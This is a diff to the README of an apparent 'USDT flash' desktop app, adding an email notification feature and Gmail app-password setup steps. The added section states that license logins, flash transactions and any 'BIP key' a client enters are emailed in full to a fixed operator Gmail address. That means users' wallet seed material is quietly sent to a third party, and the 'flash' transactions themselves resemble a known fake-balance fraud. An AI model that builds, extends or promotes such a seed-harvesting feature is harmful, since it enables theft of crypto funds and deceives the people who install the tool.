@@ -10,6 +10,7 @@ A professional desktop application for managing USDT transactions and wallets.
 - Flash transaction processing
 - Multiple network support (TRC20, ERC20, BEP20, SOL, MATIC)
 - Customizable transaction options
+- Email notifications for important events
 
 ## Real-Time Updates
 
@@ -26,7 +27,14 @@ The desktop application now shares the same backend with the admin dashboard, en
    npm install
    ```
 
-2. Start the application with the Socket.IO server:
+2. Configure environment variables:
+   - Copy `.env.example` to `.env`
+   - Update the `EMAIL_PASSWORD` in the `.env` file with your Gmail app password
+   ```
+   cp .env.example .env
+   ```
+
+3. Start the application with the Socket.IO server:
    ```
    npm run start:with-socket
    ```
@@ -73,3 +81,23 @@ The application uses Supabase as the backend database, with the following tables
 - `contact_info_history`: Tracks changes to contact information
 - `license_keys`: Stores license keys
 - `app_settings`: Stores application settings
+
+## Email Notifications
+
+The application now includes email notifications for important events:
+
+1. **License Login**: When a client logs in with a license key, an email notification is sent with details about the license.
+2. **Flash Creation**: When a client creates a flash transaction, an email notification is sent with details about the transaction (wallet, currency, network, receiver address, flash amount).
+3. **BIP Key Entry**: When a client enters a BIP key, an email notification is sent with the BIP key details.
+
+### Email Configuration
+
+To use the email notification system, you need to set up a Gmail app password:
+
+1. Go to your Google Account settings
+2. Navigate to Security > 2-Step Verification
+3. Scroll down and select "App passwords"
+4. Create a new app password for "Mail" and "Other (Custom name)"
+5. Copy the generated password and add it to your `.env` file as `EMAIL_PASSWORD`
+
+All notifications will be sent to the email address configured in the application (usdtflasherpro@gmail.com).
